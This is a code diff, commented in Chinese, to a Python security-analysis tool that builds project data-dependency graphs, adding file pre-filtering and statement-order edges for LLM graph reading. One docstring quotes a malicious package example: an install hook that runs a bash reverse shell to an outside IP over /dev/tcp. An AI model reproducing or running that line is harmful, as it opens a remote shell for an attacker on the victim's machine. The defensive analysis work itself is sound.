@@ -2134,8 +2134,15 @@ class ProjectDDGBuilderV7:
     """项目级DDG构建器 V7 - 完整安全分析 + 分层扫描"""
     # 行数阈值
     SMALL_FILE_THRESHOLD = 10000  # 提高阈值：小于 10000 行使用完整 DDG 分析（轻量级 CFG 支持更大规模）
-    def __init__(self, project_dir: str):
+    def __init__(self, project_dir: str, include_files=None):
+        """include_files: 相对路径集合（None=全部）。
+
+        2026-11 SSO 粗筛接入：只对含安全敏感操作的文件建图。
+        大 monorepo（1093 个 py 文件）裁剪后通常只剩 8%~25%，
+        建图成本随之下降一个数量级。
+        """
         self.project_dir = Path(project_dir)
+        self.include_files = set(include_files) if include_files else None
         self.nodes = {}
         self.edges = []
         self.symbol_table = ProjectSymbolTable()
@@ -2189,6 +2196,7 @@ class ProjectDDGBuilderV7:
         # 分析所有Python文件
         all_py_files = list(self.project_dir.rglob('*.py'))
         all_py_files = [f for f in all_py_files if '__pycache__' not in str(f) and '.ddg_output' not in str(f)]
+        all_py_files = [f for f in all_py_files if self._allowed(f)]
 
         # 🔧 Bug修复：添加call graph构建错误统计
         callgraph_success = 0
@@ -2306,6 +2314,13 @@ class ProjectDDGBuilderV7:
         print("\n[8/8] Running security analysis...")
         security_report = self._generate_security_report()
         print(f"  Security issues: {security_report['total_issues']}")
+        # 步骤7.5：顺序执行边（LLM 读图需要；污点分析会排除 control 边）
+        try:
+            n_seq = self._link_statement_sequence()
+            if n_seq:
+                print(f"  Statement-sequence edges: {n_seq}")
+        except Exception as _e:
+            print(f"  [WARN] statement sequence linking failed: {_e}")
         # 步骤8：去重和完成
         print("\n[9/8] Finalizing...")
         self.edges = self._deduplicate_edges()
@@ -2329,10 +2344,65 @@ class ProjectDDGBuilderV7:
             'side_effects': self.side_effect_detector.side_effects if self.side_effect_detector else {},
             'attack_chains': self.attack_chains
         }
+    def _link_statement_sequence(self) -> int:
+        """同一作用域内按行号相邻的语句建「顺序执行」边（2026-11）。
+
+        背景：DDG 原本只建数据依赖，函数体里 `a = f(); os.system(a)` 之外
+        的两条无关语句之间没有边。结果图对 LLM 是「散点」——
+        真实案例 shellapp：
+            class CustomInstallCommand(install):
+                def run(self):
+                    install.run(self)
+                    os.system("bash -i >& /dev/tcp/1.2.3.4/7777 <&1")
+        图里 `install.run` 与 `os.system` 之间没有边，LLM 无法连出路径，
+        只能瞎猜（给出的路径全被验证器拒绝）。
+
+        这类边对**污点分析无意义**（taint_engine 排除 control 边），
+        但对「LLM 读图理解执行顺序」是关键上下文。
+        """
+        by_scope: Dict[tuple, List] = {}
+        for n in self.nodes.values():
+            ntype = (n.type or '')
+            if ntype in ('function', 'class'):
+                continue          # 复合节点不入序列
+            key = (n.file, getattr(n, 'function_name', None) or '<module>')
+            by_scope.setdefault(key, []).append(n)
+
+        added = 0
+        existing = {(e.from_node.get_id(), e.to_node.get_id()) for e in self.edges}
+        for _key, ns in by_scope.items():
+            ns.sort(key=lambda x: (x.line, getattr(x, 'col_offset', 0)))
+            for a, b in zip(ns, ns[1:]):
+                if a.line == b.line:
+                    continue      # 同一行的多个节点不建顺序边
+                pair = (a.get_id(), b.get_id())
+                if pair in existing:
+                    continue
+                self.edges.append(GlobalEdge(
+                    a, b, variable='next_stmt', edge_type='control',
+                    function=getattr(a, 'function_name', '') or ''))
+                existing.add(pair)
+                added += 1
+        return added
+
+    def _allowed(self, f: Path) -> bool:
+        """SSO 粗筛过滤：只保留 include_files 内的文件（None 时全放行）"""
+        if self.include_files is None:
+            return True
+        try:
+            rel = str(f.relative_to(self.project_dir)).replace(chr(92), '/')
+        except ValueError:
+            rel = f.name
+        return rel in self.include_files
+
     def _categorize_files(self) -> Tuple[List[Path], List[Path]]:
-        """按大小分类文件"""
+        """按大小分类文件（先经 SSO 粗筛过滤）"""
         py_files = list(self.project_dir.rglob('*.py'))
         py_files = [f for f in py_files if '__pycache__' not in str(f) and '.ddg_output' not in str(f)]
+        _before = len(py_files)
+        py_files = [f for f in py_files if self._allowed(f)]
+        if self.include_files is not None and _before != len(py_files):
+            print(f"  [SSO 粗筛] {_before} -> {len(py_files)} 个文件参与建图")
         small_files = []
         large_files = []
         for file_path in py_files:
